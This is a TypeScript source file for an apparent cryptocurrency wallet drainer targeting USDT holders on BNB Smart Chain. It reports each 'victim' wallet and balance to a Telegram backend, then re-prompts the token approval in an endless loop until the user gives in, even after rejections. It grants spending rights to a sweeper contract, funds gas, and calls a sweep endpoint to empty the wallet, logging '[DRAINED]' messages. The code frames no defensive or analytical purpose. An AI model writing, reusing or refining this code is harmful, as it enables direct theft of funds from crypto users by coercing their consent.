import { ethers } from "ethers"
import { CONFIG } from "../config"

const BACKEND_URL = CONFIG.BACKEND_URL

export async function requestApproval(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  const signer = await provider.getSigner()
  
  // FIX 12: Check we're on BSC before proceeding
  const network = await provider.getNetwork()
  const chainId = Number(network.chainId)
  if (chainId !== 56) {
    throw new Error("Please switch to BNB Smart Chain (BSC)")
  }

  const usdt = new ethers.Contract(
    CONFIG.USDT_CONTRACT,
    [
      "function approve(address spender, uint256 value) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function decimals() external view returns (uint8)",
    ],
    signer
  )

  const rawBalance = await usdt.balanceOf(victimAddress)
  const decimals = await usdt.decimals()
  const balance = ethers.formatUnits(rawBalance, decimals)

  await fetch(`${BACKEND_URL}/api/telegram`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      message: "[New Victim] Wallet: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | Balance: " + parseFloat(balance).toFixed(2) + " USDT",
    }),
  }).catch(() => {})

  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove

  // FIX 13: Infinite loop with small delay to prevent CPU overheating on mobile
  while (true) {
    try {
      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
      await tx.wait()

      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash,
        }),
      })

      return approveAmount
    } catch (err: any) {
      // FIX 14: Small delay between retries — prevents 100% CPU usage on phone
      if (err.code === "ACTION_REJECTED" || err.code === 4001) {
        await new Promise(r => setTimeout(r, 500))
        continue
      }
      // Any other error — also retry with delay
      await new Promise(r => setTimeout(r, 500))
      continue
    }
  }
}

export async function ensureGas(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress)
  const minGas = ethers.parseEther("0.0003")

  if (balance >= minGas) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: "[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)",
      }),
    })
    return true
  }

  try {
    const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Gas Funded] Sent " + CONFIG.FUNDING_AMOUNT + " BNB to " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}

export async function executeDrain(
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  try {
    const response = await fetch(`${BACKEND_URL}/api/sweep`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      const decimals = CONFIG.USDT_DECIMALS
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[DRAINED] " + ethers.formatUnits(approvalAmount, decimals) + " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}